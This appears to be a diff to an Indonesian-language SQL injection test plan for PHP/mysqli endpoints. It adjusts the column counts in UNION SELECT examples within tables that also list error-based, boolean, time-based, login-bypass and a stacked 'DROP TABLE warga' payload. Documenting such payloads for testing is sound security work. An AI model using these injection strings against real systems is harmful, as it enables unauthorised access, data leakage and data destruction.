@@ -30,7 +30,7 @@ if (!$result) {
 ### Jenis Serangan
 | Jenis | Kemungkinan | Contoh |
 |-------|-------------|--------|
-| UNION-based | Tinggi | `' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- -` |
+| UNION-based | Tinggi | `' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- -` |
 | Error-based | Tinggi | `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -` |
 | Boolean-based | Tinggi | `' AND 1=1-- -` vs `' AND 1=2-- -` |
 | Time-based | Tinggi | `' AND SLEEP(5)-- -` |
@@ -145,7 +145,7 @@ $result = mysqli_query($conn, $sql);
 ### Jenis Serangan
 | Jenis | Kemungkinan | Contoh |
 |-------|-------------|--------|
-| UNION-based | Tinggi | `?id=-1 UNION SELECT 1,2,3,4,5-- -` |
+| UNION-based | Tinggi | `?id=-1 UNION SELECT 1,2,3,4,5,6-- -` |
 | Error-based | Tinggi | `?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -` |
 | Boolean-based | Tinggi | `?id=1 AND 1=1-- -` |
 | Time-based | Tinggi | `?id=1 AND SLEEP(5)-- -` |
@@ -184,7 +184,7 @@ if (mysqli_num_rows($result) > 0) {
 | Jenis | Kemungkinan | Contoh |
 |-------|-------------|--------|
 | Authentication Bypass | Tinggi | `admin'-- -` |
-| UNION-based | Tinggi | `' UNION SELECT 1,2,3,4,5-- -` |
+| UNION-based | Tinggi | `' UNION SELECT 1,2,3,4,5,6-- -` |
 | Boolean-based | Tinggi | `' OR 1=1-- -` |
 
 ### Tujuan Pengujian
@@ -214,7 +214,7 @@ $result = mysqli_query($conn, $sql);
 ### Jenis Serangan
 | Jenis | Kemungkinan | Contoh |
 |-------|-------------|--------|
-| UNION-based | Tinggi | `?q=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- -` |
+| UNION-based | Tinggi | `?q=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- -` |
 | Error-based | Tinggi | `?q=' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -` |
 | Boolean-based | Tinggi | `?q=' AND 1=1-- -` |
 | Stacked Query | Rendah* | `?q='; DROP TABLE warga;-- -` |
